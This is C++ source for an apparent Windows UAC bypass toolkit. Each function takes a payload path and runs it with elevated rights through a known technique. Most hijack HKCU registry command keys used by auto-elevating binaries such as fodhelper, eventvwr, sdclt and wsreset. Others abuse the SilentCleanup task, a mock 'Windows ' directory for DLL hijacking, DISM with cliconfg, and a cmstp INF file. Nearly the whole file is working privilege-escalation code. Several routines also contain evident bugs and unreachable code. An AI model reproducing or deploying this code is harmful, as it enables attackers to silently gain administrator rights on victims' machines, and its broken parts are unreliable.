#include "common.h"
#include "RegUAC.h"
BOOL uac_bypass_wsreset()
{
	string payload;
	cout << "Enter the path for payload: " << endl;
	cin >> payload;
	LPCSTR name = NULL;
	string cmdPath = "C:\\Windows\\System32\\cmd.exe";
	string payloadPath = cmdPath + " /c start " + payload;
	return modify_key(HKEY_CURRENT_USER, "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command", name, (LPCSTR)payloadPath.c_str(), TRUE);
}


BOOL uac_bypass_fodhelpercleanup()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;

	BOOL bModify = FALSE;

	bModify = modify_key(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", NULL, (LPCSTR)payload.c_str(), TRUE);
	if (!bModify)
		return FALSE;

	bModify = modify_key(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", "DelegateExecute", "", TRUE);
	if (!bModify)
		return FALSE;

	PVOID pvOldValue = NULL;

	if (!Wow64DisableWow64FsRedirection(&pvOldValue))
		return FALSE;

	if (!process_create(wstring(L"fodhelper.exe").c_str(),NULL))
		return FALSE;

	if (!Wow64RevertWow64FsRedirection(pvOldValue))
		return FALSE;

	return TRUE;
}

BOOL uac_bypass_eventviewer()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;
	LPCSTR name = NULL;
	BOOL bModify = FALSE;
	bModify =  modify_key(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command", name, (LPCSTR)payload.c_str(), TRUE);
	if (!bModify)
		return FALSE;

	PVOID pvOldValue = NULL;

	if (!Wow64DisableWow64FsRedirection(&pvOldValue))
		return FALSE;

	if (!process_create(wstring(L"eventvwr.exe").c_str(), NULL))
		return FALSE;

	if (!Wow64RevertWow64FsRedirection(pvOldValue))
		return FALSE;

	return TRUE;


}

BOOL ucompmgmtlauncher()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;
	LPCSTR name = NULL;
	return modify_key(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\shell\\open\\command", name, (LPCSTR)payload.c_str(), TRUE);
}

BOOL computerdefaults()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;
	LPCSTR name = NULL;
	return modify_key(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command",name, (LPCSTR)payload.c_str(), TRUE);
}

BOOL sdclt_uacbypass()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;
	LPCSTR name = NULL;
	return modify_key(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\App Path\\control.exe", name, (LPCSTR)payload.c_str(), TRUE);
}

BOOL sdclt_isolatedcommand()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;
	LPCSTR name = "IsolatedCommand";
	return modify_key(HKEY_CURRENT_USER, "Software\\Classes\\exefile\\shell\\runas\\command", name, (LPCSTR)payload.c_str(), TRUE);
}

BOOL slui()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;
	LPCSTR name = NULL;
	return modify_key(HKEY_CURRENT_USER, "Software\\Classes\\exefile\\shell\\open\\command", name, (LPCSTR)payload.c_str(), TRUE);
}

BOOL uac_silentcleanup()
{
	string payload;
	cout << "Enter the path for payload" << endl;
	cin >> payload;
	string payloadPath = "cmd.exe /c start " + payload + " &&";
	LPCSTR name = "windir";
	BOOL bModify = modify_key(HKEY_CURRENT_USER, "Environment", name, (LPCSTR)payloadPath.c_str(), TRUE);
	
	if (!bModify)
		return FALSE;

	PVOID pvOldValue = NULL;
	if (!Wow64DisableWow64FsRedirection(&pvOldValue))
		return FALSE;

	if (!process_create(wstring(L"schtasks.exe").c_str(), wstring(L"/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I").c_str()))
		return FALSE;

	if (!Wow64RevertWow64FsRedirection(pvOldValue))
		return FALSE;

	return TRUE;
}

void write_resource(LPCSTR filename, LPCSTR filepath)
{
	HRSRC hRsec = NULL;
	DWORD dSize = NULL;
	HMODULE  hMod = GetModuleHandle(NULL);
	hRsec = FindResourceA(hMod, MAKEINTRESOURCE(filename), filename);
	dSize = SizeofResource(hMod, hRsec);
	void* hGlob = LoadResource(hMod, hRsec);
	HANDLE hLl = CreateFileA(filepath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
	if (hLl == INVALID_HANDLE_VALUE)
	{
		printf("error in creating file: %x \n", GetLastError());
	}
	DWORD sizeOut;
	BOOL check3 = WriteFile(hLl, hGlob, dSize, &sizeOut, NULL);
	if (check3 == 0)
	{
		printf("error in writing file: %x \n", GetLastError());

	}
	CloseHandle(hLl);
}


BOOL uac_mockdir()
{
	string payload = "C:\\Windows\\System32\\notepad.exe";
	string sPath = "C:\\Windows\\System32\\fodhelper.exe";
	string dPath = "\\\\?\\C:\\Windows \\System32\\fodhelper.exe";

	string path = "\\\\?\\C:\\Windows \\System32\\winmm.dll";
	CHAR* buffer[1024];
	if (!CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0)) {
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			RemoveDirectory("\\\\?\\C:\\Windows \\");
		}
		else {
			
				printf("error in creating directory1: %x \n", GetLastError());
	
		}
	}
	if (!CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0)) {
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			RemoveDirectory("\\\\?\\C:\\Windows \\System32");
		}
		else {

			printf("error in creating directory2: %x \n", GetLastError());

		}
	}
	CopyFileA((LPCSTR)sPath.c_str(),(LPCSTR)dPath.c_str(),FALSE);
	
	write_resource((LPCSTR)payload.c_str(), (LPCSTR)sPath.c_str());
	PVOID pvOldValue = NULL;
	if (!Wow64DisableWow64FsRedirection(&pvOldValue))
		return FALSE;

	if (!process_create(wstring(L"fodhelper.exe").c_str(), wstring(L"C:\\Windows\\System32\\fodhelper.exe").c_str()))
		return FALSE;

	if (!Wow64RevertWow64FsRedirection(pvOldValue))
		return FALSE;

	return TRUE;

}


BOOL uac_perfmon()
{
	string payload;
	cout << "Enter the path for payload: " << endl;
	cin >> payload;
	
	string Path = "Volatile Environment";
	string buffer = "C:\TEM";
	DWORD dTemp = GetTempPathA(1024, (LPSTR)buffer.c_str());
	const CHAR* sPath = dTemp + "System32";
	CreateDirectoryA((LPCSTR)sPath, NULL);
	const CHAR* spath1 = dTemp + "system32\\mmc.exe";
	CreateDirectoryA((LPCSTR)dTemp, NULL);
	CopyFileA( (LPCSTR)payload.c_str(), (LPCSTR)spath1, FALSE);//getpathfunction
	return modify_key(HKEY_CURRENT_USER, (LPCSTR)Path.c_str(), "SYSTEMROOT", (LPCSTR)dTemp, TRUE);

	PVOID pvOldValue = NULL;
	if (!Wow64DisableWow64FsRedirection(&pvOldValue))
		return FALSE;

	if (!process_create(wstring(L"perfmon.exe").c_str(), wstring(L"C:\\Windows\\System32").c_str()))
		return FALSE;

	if (!Wow64RevertWow64FsRedirection(pvOldValue))
		return FALSE;

	return TRUE;
}

BOOL uac_runas()
{
	string payloads; 
	string paramss;
	cout << "Enter payload \n";
	cin >> payloads ;
	OFSTRUCT buffer = { 0 };
  
	if (endsWith(payloads,".exe") == TRUE)
	{
		paramss = ' ';
	}
	HFILE manifest = OpenFile((LPCSTR)payloads.c_str(),&buffer, OF_READ);
	if (manifest == HFILE_ERROR)
	{
		cout << "cannot open file succesfully...";
	}
	if (wcscmp(L"<autoElevate>true</autoElevate>",(LPCWSTR)payloads.c_str()) && wcscmp(L"<autoElevate xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</autoElevate>",(LPCWSTR)payloads.c_str()))
	{
		
		if (!process_runas((LPCWSTR)payloads.c_str(), (LPCWSTR)paramss.c_str()))
			return FALSE;

	}
	else
	{
		return FALSE;
	}

}


BOOL uac_cliconfg()
{

	string payload;
	OFSTRUCT buffer1 = { 0 };
	string appdata = "%WINDIR%";
	string appdata1 = "%USERPROFILE%";
	string destPath = "\\System32";
	string destTemp = "\\AppData\\Local\\Temp\\";
	string path = "NTWDBLIB.dll";
	string path1 = "suspicious.cab";
	cout << "Enter the payload \n";
	cin >> payload;
	char writeBuff[] = { 0 };
	DWORD nSize;
	char* dataBuff;
	DWORD nByte = 0;
	HANDLE hOpen;
	DWORD bSize;
	HANDLE hFile{};
	LARGE_INTEGER structInt;
	if (endsWith(payload, ".dll"))
	{
	 hFile = CreateFileA((LPCSTR)payload.c_str(),GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	 if (hFile == INVALID_HANDLE_VALUE)
	 {
		 printf("function failed to create file: %x \n", GetLastError());
	 }
	}
	bSize =  GetFileSize(hFile, NULL);
	if (bSize == 0)
	{
		printf("function failed to find size: %x \n", GetLastError());
	}
	dataBuff = (char*)malloc(bSize);
	DWORD nByte1 = 0;

	DWORD size1 = ExpandEnvironmentStrings((LPCSTR)appdata1.c_str(), NULL, NULL);
	if (size1 == 0)
	{
		printf("Function failed to expand variable: %x \n", GetLastError());
	}

	char* resultString1 = new char[(DWORD)size1];
	DWORD size2 = ExpandEnvironmentStrings((LPCSTR)appdata1.c_str(), resultString1, (DWORD)(size1));
	if (size2 == 0)
	{
		printf("Function failed to expand variable: %x \n", GetLastError());
	}

	string finalTemp = resultString1 + destTemp;
	const char* finalBuff = finalTemp.c_str();

	DWORD dTemp = GetTempPathA(sizeof(finalBuff), (LPSTR)finalBuff);
	
	if (dTemp == 0)
	{
		printf("function failed to create temp path: %x \n", GetLastError());
	}

	string add = finalBuff + path;
	string add1 = finalBuff + path1;
	
	hOpen = CreateFileA((LPCSTR)add.c_str(), GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOpen == INVALID_HANDLE_VALUE)
	{
		printf("function failed to create file1: %x \n", GetLastError());
	}
	

	BOOL bRead = ReadFile(hFile, dataBuff,bSize, &nByte1, NULL);
	if (bRead == 0)
	{
		printf("function failed to read  file: %x \n", GetLastError());

	}

	BOOL bWrite = WriteFile(hOpen, dataBuff, nByte1, &nByte, NULL);
	if (bWrite == 0)
	{
		printf("function failed to write  file: %x \n", GetLastError());
	}

	CloseHandle(hOpen);
	CloseHandle(hFile);

	string addPath = add + " " + add1;
	if (PathFileExists((LPCSTR)add.c_str()) == TRUE)
	{
		if (process_create(L"makecab.exe", (LPCWSTR)addPath.c_str()))
		{
			printf("Succesfully created cabnit file1\n");
		}
		else
		{
			printf("unable to create cabnit file1\n");
		}
	}

	DWORD size = ExpandEnvironmentStrings((LPCSTR)appdata.c_str(), NULL, NULL);
	if (size == 0)
	{
		printf("Function failed to expand variable: %x \n", GetLastError());
	}


	char* resultString = new char[(DWORD)size];
	DWORD size3 = ExpandEnvironmentStrings((LPCSTR)appdata.c_str(), resultString, (DWORD)(size));
	if (size3 == 0)
	{
		printf("Function failed to expand variable: %x \n", GetLastError());
	}
	string finalPath = resultString + destPath;
	string tempo = "/add-package";
	string addPath1 = "/online " + tempo + " /packagepath:" + add1 +" /quiet/norestart/logpath:" + finalPath;
	


	if (PathFileExists((LPCSTR)add1.c_str()) == TRUE)
	{
		if (process_create(L"dism.exe", (LPCWSTR)addPath1.c_str()))
		{
			printf("Succesfuly created cabnit file2\n");
		}
		else
		{
			printf("unable to create cabnit file2 \n");
		}
	}

	PVOID pvOldValue = NULL;


	if (!Wow64DisableWow64FsRedirection(&pvOldValue))
		return FALSE;

	if (!process_create(wstring(L"cliconfg.exe").c_str(), (LPCWSTR)finalPath.c_str()));
		return FALSE;

	if (!Wow64RevertWow64FsRedirection(pvOldValue))
		return FALSE;

}

BOOL uac_cmstp()
{
	string payload;
	HANDLE hOpen;
	string tempPath = "%TEMP%";
	cout << "Enter the payload value:\n";
	cin >> payload;
	BOOL bWrite;
	DWORD size2, size1,nByte1 = 0, nByte, dTemp;
	CHAR buffer[] = {0};
	string inf_template,path,data1;

	if (endsWith(payload, ".exe"))
	{
		string data = "Signature=$chicago$\n";
		inf_template = "[version]\n" + data + "AdvancedINF=2.5\n" + "\n" + "[DefaultInstall]\n" + "CustomDestination=CustInstDestSectionAllUsers\n" + "RunPreSetupCommands=RunPreSetupCommandsSection\n" + "\n" + "[RunPreSetupCommandsSection]\n" + payload + "\n" + "taskkill /IM cmstp.exe /F\n" + "\n" + "[CustInstDestSectionAllUsers]\n" + "49000,49001=AllUSer_LDIDSection, 7\n" + "\n" + "[AllUSer_LDIDSection]\n" + "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", " + "\"\"" + "\n" + "\n" + "[Strings]\n" + "ServiceName=\"testVPN\"\n" + "ShortSvcName=\"testVPN\"\n";
		//char* buffer[] = new char[inf_template];
		size1 = ExpandEnvironmentStrings((LPCSTR)tempPath.c_str(), NULL, NULL);
		if (size1 == 0)
		{
			printf("Function failed to expand variable: %x \n", GetLastError());
		}

		char* resultString1 = new char[(DWORD)size1];
		size2 = ExpandEnvironmentStrings((LPCSTR)tempPath.c_str(), resultString1, (DWORD)(size1));
		if (size2 == 0)
		{
			printf("Function failed to expand variable: %x \n", GetLastError());
		}

		dTemp = GetTempPathA(1024, resultString1);
		path = string(resultString1) + "tmp.ini";

		hOpen = CreateFileA((LPCSTR)path.c_str(), GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hOpen == INVALID_HANDLE_VALUE)
		{
			printf("function failed to create file1: %x \n", GetLastError());
		}

		bWrite = WriteFile(hOpen, inf_template.c_str(), strlen(inf_template.c_str()), &nByte, NULL);
		if (bWrite == 0)
		{
			printf("function failed to write  file: %x \n", GetLastError());
		}

		CloseHandle(hOpen);
		if (TerminateProcess("cmstp.exe", PROCESS_TERMINATE))
		{
			printf("Successfully terminated process cmstp.exe");
		}

		wstring pathFortmp = L"/au " + wstring(path.begin(), path.end());
		BOOL  check = process_create(L"cmstp.exe", (LPCWSTR)pathFortmp.c_str());

		Sleep(1000 * 5);

		keybd_event(VK_RETURN, 0x0D, KEYEVENTF_EXTENDEDKEY, 1);

		return TRUE;
	}
	else
	{
		printf("Cannot proceed, invalid paylaod: \n");
		return FALSE;

	}
}